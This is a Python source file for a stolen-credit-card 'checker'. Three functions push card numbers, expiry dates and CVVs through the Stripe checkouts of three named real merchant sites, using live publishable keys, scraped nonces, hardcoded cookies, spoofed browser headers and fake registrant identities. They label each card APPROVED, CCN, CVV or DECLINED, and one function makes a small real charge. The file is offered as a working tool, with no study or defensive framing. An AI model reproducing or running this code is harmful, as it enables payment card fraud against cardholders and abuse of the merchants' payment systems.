import requests
import re
from faker import Faker
from utils import get_string_between, generate_random_email, get_card_type_from_bin # Relative import from parent directory

def Tele(session, cc):
    try:
        card, mm, yy, cvv = cc.split("|")
        if "20" in yy:
            yy = yy.split("20")[1]
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        data = f'type=card&card[number]={card}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20)
        res = response.text
        if 'error' in res:
            error_message = response.json()['error']['message']
            if 'code' in error_message:
                return "CCN ✅"
            else:
                return "DECLINED ❌"
        else:
            payment_method_id = response.json()['id']
            headers = {
                'authority': 'www.thetravelinstitute.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.thetravelinstitute.com',
                'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            params = {
                'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            }
            response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers,timeout=20)
            html=(response.text)
            nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html).group(1)
            data = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': payment_method_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce,
            }
            response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data, timeout=20)
            res = response.json()
            if res['success'] == False:
                error = res['data']['error']['message']
                if 'code' in error:
                     return "CCN ✅"
                else:
                    return "DECLINED ❌"
            else:
                return "APPROVED ✅"
    except Exception as e:
        print(f"Error in Tele function: {e}")
        return "Error"

def Tele_stripe2(session, cc):
    try:
        card, mm, yy, cvv = cc.split("|")
        if "20" in yy:
            yy = yy.split("20")[1]
        API_STRIPE = "pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX"
        headers1 = {
            'Host': 'api.stripe.com',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Path': '/v1/payment_methods',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188'
        }
        data1 = {
            'type': 'card',
            'card[number]': card,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'guid': '1fa816a3-cb1f-4128-be42-7282b81afcb1a3a78f',
            'muid': '7f46e3e6-1b8c-493a-9d4b-5fde0f8c25d1d76045',
            'sid': '7a3d84d5-adb1-422b-a174-93f94b609dff13111e',
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/3b6d306271; stripe-js-v3/3b6d306271; split-card-element',
            'referrer': 'https://937footballinsider.com',
            'time_on_page': '26176',
            'key': API_STRIPE,
            '_stripe_account': 'acct_1KHCEQEOdymRpNEG'
        }
        response1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers1, data=data1, timeout=20)
        result1 = response1.text
        if 'error' in result1:
            error_message_stripe = response1.json().get('error', {}).get('message', 'Stripe Error')
            if 'card_declined' in error_message_stripe:
                return "DECLINED ❌"
            elif 'incorrect_cvc' in error_message_stripe or 'invalid_cvc' in error_message_stripe:
                return "CCN ✅"
            elif 'expired_card' in error_message_stripe:
                return "EXPIRED ❌"
            elif 'insufficient_funds' in error_message_stripe:
                return "CVV ✅"
            else:
                return "DECLINED ❌"
        else:
            payment_method_id = response1.json()['id']
            headers2 = {
                'authority': '937footballinsider.com',
                'method': 'POST',
                'path': '/membership-account/membership-checkout/',
                'scheme': 'https',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
                'cnntent-Type': 'application/x-www-form-urlencoded',
                'cookie': 'asp_transient_id=bd5da2ddc9e7b772a65c25db5fae3af9;PHPSESSID=uglqu0rrbksib0lcb0stqptko0;pmpro_visit=1;__stripe_mid=7f46e3e6-1b8c-493a-9d4b-5fde0f8c25d1d76045;__stripe_sid=7a3d84d5-adb1-422b-a174-93f94b609dff13111e',
                'origin': 'https://937footballinsider.com',
                'referer': 'https://937footballinsider.com/membership-account/membership-checkout/',
                'sec-Fetch-Dest': 'document',
                'sec-Fetch-Mode': 'navigate',
                'sec-Fetch-Site': 'same-origin',
                'user-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            }
            email = generate_random_email()
            username = generate_username()
            password = generate_password()
            data2 = {
                'level': '1',
                'checkjavascript': '1',
                'username': username,
                'password': password,
                'password2': password,
                'bemail': email,
                'bconfirmemail': email,
                'fullname': '',
                'CardType': get_card_type_from_bin(card[:1]),
                'submit-checkout': '1',
                'javascriptok': '1',
                'payment_method_id': payment_method_id,
                'AccountNumber': 'XXXXXXXXXXXX' + card[-4:],
                'ExpirationMonth': mm,
                'ExpirationYear': yy
            }
            response2 = requests.post('https://937footballinsider.com/membership-account/membership-checkout/', headers=headers2, data=data2, timeout=20)
            result2 = response2.text
            if any(keyword in result2 for keyword in [
                'Thank you for your membership.',
                "Membership Confirmation",
                'Your card zip code is incorrect.',
                "Thank You For Donation.",
                "incorrect_zip",
                "Success ",
                '"type":"one-time"',
                "/donations/thank_you?donation_number="
            ]):
                return "APPROVED ✅"
            elif any(keyword in result2 for keyword in [
                'Error updating default payment method.Your card does not support this type of purchase.',
                "Your card does not support this type of purchase.",
                'transaction_not_allowed',
                "insufficient_funds",
                "incorrect_zip",
                "Your card has insufficient funds.",
                '"status":"success"',
                "stripe_3ds2_fingerprint"
            ]):
                return "APPROVED ✅"
            elif any(keyword in result2 for keyword in [
                'security code is incorrect.',
                'security code is invalid.',
                "Your card's security code is incorrect."
            ]):
                return "CCN ✅"
            elif "Error updating default payment method. Your card was declined." in result2:
                return "DECLINED ❌"
            elif "Unknown error generating account. Please contact us to set up your membership." in result2:
                return "DECLINED ❌"
            else:
                return "DECLINED ❌"
    except Exception as e:
        print(f"Error in Tele_stripe2 function: {e}")
        return "Error"

def Tele_stripe4(session, cc):
    try:
        n,mm,yy,cvv=cc.split('|')
        if '20' in yy:
            yy = yy.replace('20','')
        f = Faker()
        u = f.user_agent()
        mail=str(f.email()).replace('example','gmail')
        name=str(f.name())
        frs = name.split(' ')[0]
        las = name.split(' ')[1]
        cookies = {
            "_ga": "GA1.1.478559500.1718418847",
            "_ga_4HXMJ7D3T6": "GS1.1.1718418846.1.1.1718419251.0.0.0",
            "_ga_KQ5ZJRZGQR": "GS1.1.1718418847.1.1.1718419283.0.0.0",
            "_gcl_au": "1.1.82229850.1718418847",
            "ci_session": "cf9fqehv7d1crq8qk91d4h88gqeduo6q",
            "optiMonkClientId": "46e544be-7283-dd23-9914-6f4df852ee60"
        }

        headers = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "authority": "www.lagreeod.com",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.lagreeod.com",
            "referer": "https://www.lagreeod.com/subscribe",
            "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": u,
            "x-requested-with": "XMLHttpRequest"
        }

        data = {
            "card[cvc]": cvv,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "card[name]": "ahaha",
            "card[number]": n,
            "coupon": "10080",
            "email": mail,
            "firstname": frs,
            "lastname": las,
            "password": "Kilwa2003",
            "s1": "8",
            "stripe_customer": "",
            "subscription_type": "Weekly+Subscription",
            "sum": "28" # 4$ charge
        }

        response = requests.post("https://www.lagreeod.com/register/validate_subscribe", data=data, headers=headers, cookies=cookies, timeout=20)
        text=response.text
        if 'Your card has insufficient funds.' in text:
            return "CVV ✅"
        elif 'was declined' in text or 'number' in text:
            return "DECLINED ❌"
        elif 'Retry later' in text:
            return "Error" # Indicate error for retry
        elif 'requires_action' in text:
            return "APPROVED ✅" # Assuming requires_action means successful auth
        elif 'message' in text:
            return "APPROVED ✅" # Assuming message in text means successful registration and auth (adjust if needed based on actual response)
        else:
            return "DECLINED ❌" # Default to declined if no clear indicator

    except Exception as e:
        print(f"Error in Tele_stripe4 function: {e}")
        return "Error"
